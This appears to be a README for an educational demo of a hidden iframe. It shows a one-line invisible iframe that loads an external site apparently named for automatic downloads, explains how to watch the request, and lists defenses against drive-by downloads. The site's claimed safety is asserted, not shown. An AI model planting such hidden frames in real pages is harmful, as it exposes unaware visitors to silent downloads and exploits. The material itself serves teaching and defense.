# 🔹 Hidden iFrame Demo (Safe Example)

### 📌 Overview

This HTML file demonstrates the concept of a **hidden iFrame** in a **safe and educational way**.
It loads an external page (`https://auto-download-one.vercel.app/`) inside an `<iframe>` that is **invisible to the user**.

Attackers often abuse hidden iFrames to deliver exploits or malicious content without user awareness, but here it’s shown purely for **learning and testing purposes**.

### 📜 Code Explanation

```html
<iframe src="https://auto-download-one.vercel.app/" style="display:none;"></iframe>
```

* **`<iframe>`**: Embeds another webpage inside the current one.
* **`src`**: The URL that is loaded inside the iFrame.
* **`style="display:none;"`**: Makes the iFrame completely invisible — the user doesn’t see it, but the browser still loads the content.

### 🔍 How to Observe It

1. Open the HTML file in your browser.
2. Press **F12** → go to **Developer Tools**.
3. Navigate to the **Network tab**.
4. Refresh the page.
5. You’ll see a request to `https://auto-download-one.vercel.app/` even though no content appears on the screen.

### ⚠️ Real-World Context

* In **malware delivery**, attackers use hidden iFrames to silently load:

  * Exploit kits
  * Drive-by downloads
  * Redirects to malicious websites

* Because the iFrame is invisible, the user often has **no idea anything happened**.

### ✅ Defensive Measures

* Keep browsers and plugins updated.
* Block or monitor hidden iFrames with security tools.
* Use script-blockers or browser isolation in risky environments.

👉 This demo is **safe** since it only loads a benign site. The goal is to help understand **how attackers hide malicious content delivery** inside invisible frames.
